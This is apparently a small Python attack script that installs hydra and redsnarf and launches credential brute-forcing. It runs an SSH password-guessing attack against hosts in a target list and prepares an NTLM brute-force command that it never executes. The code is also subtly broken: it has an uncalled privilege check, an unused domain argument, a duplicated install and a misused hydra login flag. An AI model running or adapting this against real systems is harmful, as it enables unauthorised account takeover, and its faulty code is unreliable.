import os
import sys
import subprocess
import string
import random
from pathlib import Path
import argparse
import requests
import urllib
import urllib3
import collections

parser = argparse.ArgumentParser()
parser.add_argument("--domain", help = "Domain")

args = parser.parse_args()

domain = args.domain


def check_privileges():

    if not os.environ.get("SUDO_UID") and os.geteuid() != 0:
        raise PermissionError("You need to run this script with sudo or as root.")

os.system("sudo apt-get install hydra -y")
os.system("sudo apt-get install redsnarf -y")

print("Brute SSH...")
os.system("sudo apt-get install hydra -y")


hydrassh = 'hydra -l usernames.txt -P passwords.txt -M targets.txt ssh'
  
os.system(hydrassh)

print("brute NTLM")

redsnaf = 'redsnarf -H file=targets.txt -hS usernames.txt -hP passwords.txt -cQ y'
